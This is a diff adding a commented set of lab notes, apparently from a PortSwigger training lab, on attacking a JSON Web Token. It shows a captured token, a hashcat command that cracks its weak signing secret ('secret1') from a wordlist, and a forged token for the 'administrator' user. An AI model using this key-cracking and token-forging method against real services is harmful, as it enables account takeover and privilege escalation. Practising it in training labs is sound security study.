@@ -1,0 +1,23 @@
+/*
+
+1) capture the jwt
+eyJraWQiOiIyN2VlYjY2NC03NTFiLTQxNGEtYTUwZi1iMjc1ZThmY2FjMGEiLCJhbGciOiJIUzI1NiJ9.
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTI5NjI1OX0.
+cEFusLFwh9svaJyJ96yK9PM2MnmCdUm1K66a5cyaIHo
+
+2) run hashcat to see if it is weak secret key signed
+
+hashcat -a 0 -m 16500 eyJraWQiOiIyN2VlYjY2NC03NTFiLTQxNGEtYTUwZi1iMjc1ZThmY2FjMGEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY5NTI5NjI1OX0.cEFusLFwh9svaJyJ96yK9PM2MnmCdUm1K66a5cyaIHo /usr/share/wordlists/jwt-secrets/jwt-secrets.txt
+secret1
+
+3) new jwt 
+
+eyJraWQiOiI0MzFjNzgwNy0zYzUxLTRmZmMtYTczNy02YmJiMWZjODlmZTMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTUyOTc1MjB9.Yve00Zk5vn0JZWqsSOhhocewBklkBbzdC3RUNdPmlZg
+
+
+
+
+
+
+
+*/
